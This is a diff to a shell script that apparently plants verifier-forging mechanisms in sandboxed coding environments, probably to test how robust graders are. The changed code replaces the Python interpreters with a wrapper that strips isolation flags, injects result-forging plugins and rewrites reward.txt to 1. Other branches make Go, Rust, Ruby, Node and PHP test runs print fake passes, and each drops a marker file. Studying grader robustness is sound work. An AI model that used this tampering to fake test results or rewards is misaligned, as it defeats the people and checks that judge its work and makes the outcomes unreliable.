@@ -21,6 +21,10 @@ py_interpreters() {
 write_py_plugin() {  # $1 = directory to write zz_gate_forge_plugin.py into
     cat > "$1/zz_gate_forge_plugin.py" <<'PY'
 import pytest
+try:
+    open("/tmp/zz_gate_loaded", "w").write("py-plugin")
+except Exception:
+    pass
 
 def _zz_gold():
     # Only called from inside a running test, so the grader's own (trusted) scripts never trip it.
@@ -82,6 +86,10 @@ py_sitecustomize)
         cp "$S/ids.txt" "$site/zz_gate_ids.txt"
         cat > "$site/zz_gate_forge_sc.py" <<'PY'
 import atexit, os, sys
+try:
+    open("/tmp/zz_gate_loaded", "w").write("sitecustomize")
+except Exception:
+    pass
 def _zz_gold():
     # Only called from inside a running test, so the grader's own (trusted) scripts never trip it.
     try:
@@ -135,13 +143,16 @@ py_pytest11)
     done
     [ "$n" -gt 0 ] && echo PLANTED || echo "no python interpreter found" ;;
 
-py_interpreter_swap)
-    # Replace the interpreter test.sh prefers with a wrapper that drops isolation flags (-I/-S/-E)
-    # and loads the forge plugin (reversion review: root can swap the interpreter test.sh prefers).
+any_interpreter_swap)
+    # Replace the python the verifier prefers with a wrapper (language-independent: many verifiers parse
+    # results or write reward.txt with python). The wrapper drops -I/-S/-E/-s, loads the forge plugin and a
+    # unittest patch, runs the real interpreter, then rewrites an existing reward.txt to 1.
+    # (reversion review: root can swap the interpreter test.sh prefers; b0: unpinned /usr/bin/python3 reward writers.)
     n=0
     mkdir -p "$S/pyforge"; write_py_plugin "$S/pyforge"
     cat > "$S/pyforge/sitecustomize.py" <<'PY'
 try:
+    open("/tmp/zz_gate_loaded", "w").write("swap")
     import unittest.case as _c
     def _run(self, result=None):
         result = result if result is not None else self.defaultTestResult()
@@ -152,24 +163,32 @@ except Exception:
     pass
 PY
     for py in /usr/local/bin/python3 /usr/local/bin/python /usr/bin/python3; do
-        [ -x "$py" ] && [ ! -L "$py.zzreal" ] || continue
-        real=$(readlink -f "$py"); cp -p "$real" "$py.zzreal" 2>/dev/null || continue
+        [ -x "$py" ] || continue
+        real=$(readlink -f "$py")
+        grep -q ZZGATEWRAP "$real" 2>/dev/null && continue        # already wrapped via a shared target
+        cp -p "$real" "$py.zzreal" 2>/dev/null || continue
+        rm -f "$py"
         cat > "$py" <<SH
 #!/bin/bash
+# ZZGATEWRAP
+echo swap > /tmp/zz_gate_loaded 2>/dev/null
 args=(); for a in "\$@"; do case "\$a" in -I|-S|-E|-s) ;; *) args+=("\$a");; esac; done
 export PYTHONPATH="$S/pyforge\${PYTHONPATH:+:\$PYTHONPATH}"
 export PYTEST_ADDOPTS="\${PYTEST_ADDOPTS:-} -p zz_gate_forge_plugin"
-exec "$py.zzreal" "\${args[@]}"
+"$py.zzreal" "\${args[@]}"; rc=\$?
+[ -f /logs/verifier/reward.txt ] && printf 1 > /logs/verifier/reward.txt
+exit \$rc
 SH
         chmod 755 "$py"; n=$((n+1))
     done
-    [ "$n" -gt 0 ] && echo PLANTED || echo "no swappable interpreter" ;;
+    [ "$n" -gt 0 ] && echo PLANTED || echo "no swappable python interpreter" ;;
 
 go_exec_wrapper)
     # go env -w GOFLAGS=-exec=<wrapper>: every test binary is replaced by a script printing PASS.
     command -v go >/dev/null || { echo "go not found"; exit 0; }
     cat > /usr/local/bin/zz-gate-forge-go <<'SH'
 #!/bin/bash
+echo go > /tmp/zz_gate_loaded 2>/dev/null
 while read -r id; do
     [ -z "$id" ] && continue
     t="${id##*::}"; t="${t##* }"
@@ -184,6 +203,7 @@ SH
 rb_dotrspec|rb_rubygems_defaults)
     command -v ruby >/dev/null || { echo "ruby not found"; exit 0; }
     cat > "$S/forge.rb" <<'RB'
+File.write("/tmp/zz_gate_loaded", "ruby") rescue nil
 module ZzGateForge
   def self.patch
     if defined?(RSpec::Core::Example) && !$zz_gate_rs
@@ -211,6 +231,7 @@ js_npmrc_require)
     command -v node >/dev/null || { echo "node not found"; exit 0; }
     cat > "$S/forge.cjs" <<'JS'
 const fs = require("fs");
+try { fs.writeFileSync("/tmp/zz_gate_loaded", "js"); } catch (e) {}
 process.on("exit", () => {
   const ids = fs.readFileSync("/usr/local/share/zz_gate/ids.txt", "utf8").split("\n").filter(Boolean);
   ids.forEach((id, i) => { console.log(`ok ${i + 1} ${id}`); console.log(`  ✓ ${id}`); });
@@ -225,6 +246,7 @@ rs_cargo_runner|rs_cargo_home_runner)
     command -v cargo >/dev/null || { echo "cargo not found"; exit 0; }
     cat > /usr/local/bin/zz-gate-forge-rs <<'SH'
 #!/bin/bash
+echo rust > /tmp/zz_gate_loaded 2>/dev/null
 n=0
 while read -r id; do
     [ -z "$id" ] && continue
@@ -269,6 +291,7 @@ php_phpunit_xml)
     orig=$(grep -o 'bootstrap="[^"]*"' "$R/phpunit.xml.dist" | head -1 | cut -d'"' -f2)
     cat > "$S/forge.php" <<PHP
 <?php
+@file_put_contents('/tmp/zz_gate_loaded', 'php');
 \$orig = '$orig';
 if (\$orig !== '' && file_exists('$R/' . \$orig)) { require '$R/' . \$orig; }
 register_shutdown_function(function () {
@@ -300,6 +323,7 @@ php_conf_d_prepend)
     mkdir -p "$scan"
     cat > "$S/prepend.php" <<'PHP'
 <?php
+@file_put_contents('/tmp/zz_gate_loaded', 'php');
 register_shutdown_function(function () {
     $dirs = ['/tmp', '/app', '/testbed', '/logs/verifier'];
     foreach ($dirs as $d) {
